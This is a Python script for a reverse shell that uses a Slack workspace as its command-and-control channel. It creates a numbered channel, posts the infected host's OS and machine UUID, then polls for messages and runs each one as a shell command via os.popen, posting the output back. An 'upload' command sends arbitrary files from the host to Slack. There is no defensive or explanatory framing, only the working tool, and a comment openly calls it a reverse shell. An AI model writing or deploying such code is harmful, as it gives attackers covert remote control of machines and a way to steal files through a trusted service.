from ast import literal_eval
import json
import os
import platform
import re
import slack
import subprocess
import sys
import time
import yaml

def run_c(input_c, sh_channel_id):

    if input_c[:7] == "upload ":
        try:
            out = client.files_upload(file=input_c[7:],
                                    channels=sh_channel_id,
                                    filename=input_c[7:],
                                    title=input_c[7:],
                                    )

            assert out["ok"]

            return f"Uploaded {input_c[7:]}"
        except FileNotFoundError:
            return "File not found."

    elif input_c == "sh_exit":
        sys.exit(0)

    elif input_c[:3] == "cd ":
        out = os.chdir(input_c[3:])
        return "cd complete."

    else:
        try:
            out = os.popen(input_c).read()
        except:
            print("OS POPEN exception!")

        if out == "":
            return "The command did not return anything."
        else:
            return out


# TODO:
# Function the script up 


def next_sh(channel_names):
    # For some reason this stopped working
    numbers = []
    sh_num = 0

    try:
        for channel in channel_names:
            current_sh_name = channel.get("name")
            if channel_prefix in channel.get("name"):
                channel_number = channel.get("name").split("-")[2]
                if channel_number.isdigit():
                    numbers.append(int(channel_number))

        return max(numbers) + 1

    except ValueError:
        return sh_num + 1

    return sh_num


def init_conn():
    if platform.system() == "Windows":
        machine_UUID = str(subprocess.check_output("wmic csproduct get UUID"))
    elif platform.system() == "Linux":
        machine_UUID = str(subprocess.check_output(["cat", "/etc/machine-id"]).decode().strip())
    elif platform.system() == "Darwin":
        machine_UUID = str(subprocess.check_output(["ioreg",
                                                    "-d2",
                                                    "-c",
                                                    "IOPlatformExpertDevice",
                                                    "|",
                                                    "awk",
                                                    "-F",
                                                    "'/IOPlatformUUID/{print $(NF-1)}'"
                                                   ])
                           )
    else:
        machine_UUID = str("unknown")

    sh_stdout = f"`{platform.system()}` with the `{machine_UUID}` UUID connected."

    return sh_stdout


with open("config.yaml") as file:
    settings = yaml.load(file, Loader=yaml.FullLoader)

    op_user_ids = settings["member_id"]
    channel_prefix = settings["channel_prefix"]

    # Uses TLS 1.2 without ssl=sslcert 
    client = slack.WebClient(token=settings["bot_user_oauth_token"])

channels_list = client.conversations_list()
channel_names = channels_list.__getitem__("channels")

# Calculate biggest sh number (create channels from where we left off)
sh_num = next_sh(channel_names)

sh_stdout = init_conn()

new_channel_name = str(channel_prefix + str(sh_num))
# client.conversations_close("sierra-hotel-5")

# If UUID != any of the channels:
create_response = client.conversations_create(name=new_channel_name, # List channels, give number to channels.
                                              is_private = False, # Operator would need to be invited to the channel even if the op is the channel admin. 
                                              user_ids = op_user_ids # Set to true for a private channel.
                                             )

sh_channel = create_response.__getitem__("channel")
sh_channel_id = sh_channel["id"]
sh_channel_name = sh_channel["name"]

print(f"{sh_channel_name} ID: {sh_channel_id}")
print(f"Please search for {sh_channel_name} in your Slack workspace to use the reverse shell")

# conversations.join - Use the user API to join the channel later
client.conversations_join(channel = sh_channel_id)

# Slack doesnt let us remove channels for now.
time.sleep(1)


response = client.chat_postMessage(channel=sh_channel_id, text=sh_stdout)
assert response["ok"]
# assert response["message"]["text"] == sh_stdout
time.sleep(1)


sh_comm = ""
old_messages = ""
messages = "randomval"

while True:

    sh_history = client.conversations_history(channel = sh_channel_id)
    time.sleep(0.3)
    messages = sh_history.__getitem__("messages")[0]

    if old_messages == messages:
        continue
    else:
        if "client_msg_id" in messages:
            sh_comm = messages["text"]
            sh_stdout = run_c(sh_comm, sh_channel_id)

            response = client.chat_postMessage(channel=sh_channel_id, text=sh_stdout)
            assert response["ok"]
            assert response["message"]["text"] == sh_stdout

            sh_comm = ""

        old_messages = messages

    time.sleep(0.3)